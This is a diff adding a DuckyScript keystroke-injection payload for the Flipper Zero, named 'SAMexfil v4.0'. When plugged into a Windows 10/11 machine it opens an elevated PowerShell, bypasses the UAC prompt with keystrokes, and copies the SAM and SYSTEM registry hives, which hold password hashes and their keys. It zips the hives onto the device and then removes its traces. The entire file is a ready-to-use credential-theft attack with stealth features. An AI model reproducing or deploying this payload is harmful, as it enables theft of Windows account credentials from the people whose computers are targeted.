@@ -1,0 +1,45 @@
+REM ============================================================================
+REM SAMexfil v4.0 - Windows Stock Firmware (No Cloud)
+REM ============================================================================
+REM Author: UNC0V3R3D
+REM Firmware: Stock Flipper Zero (Any version)
+REM OS: Windows 10/11 only
+REM
+REM FEATURES:
+REM - Extracts SAM + SYSTEM hives
+REM - Saves to Flipper Zero only (no cloud)
+REM - Minimal stealth
+REM - No configuration needed
+REM - ~60 seconds execution
+REM
+REM DATA EXTRACTED:
+REM - C:\Windows\System32\config\SAM (password hashes)
+REM - C:\Windows\System32\config\SYSTEM (encryption keys)
+REM
+REM SAVED TO:
+REM - /flipper0/DUMP_FILE/[COMPUTERNAME]/sam_dump/
+REM ============================================================================
+
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 1200
+ALT y
+DELAY 1200
+GUI UP
+DELAY 1200
+REM Extract SAM + SYSTEM and save to Flipper
+STRING $flipperPath = $null; $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match '^[A-Z]:\\\\'} | Select-Object -ExpandProperty Name; ForEach ($d in $drives) { if ((Test-Path ($d + ':\flipper0')) -or (Test-Path ($d + ':\FlipperZero'))) { $flipperPath = $d + ':\'; break } }; $computerName = $env:COMPUTERNAME; $folderDateTime = (get-date).ToString('d-M-y_HHmmss'); $tempDir = $env:TEMP + '\sam_' + $folderDateTime; New-Item $tempDir -ItemType Directory -Force | Out-Null; Copy-Item 'C:\Windows\System32\config\SAM' $tempDir'\SAM' -Force -ErrorAction SilentlyContinue; Copy-Item 'C:\Windows\System32\config\SYSTEM' $tempDir'\SYSTEM' -Force -ErrorAction SilentlyContinue; if ($flipperPath) { $dumpDir = $flipperPath + 'flipper0\DUMP_FILE\' + $computerName + '\sam_dump'; New-Item $dumpDir -ItemType Directory -Force | Out-Null; Compress-Archive -Path $tempDir -DestinationPath ($dumpDir + '\sam_dump_' + $folderDateTime + '.zip') -Force; }; Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue; clear; exit
+ENTER
+DELAY 1000
+WINDOWS t
+DELAY 500
+ALT F4
+DELAY 500
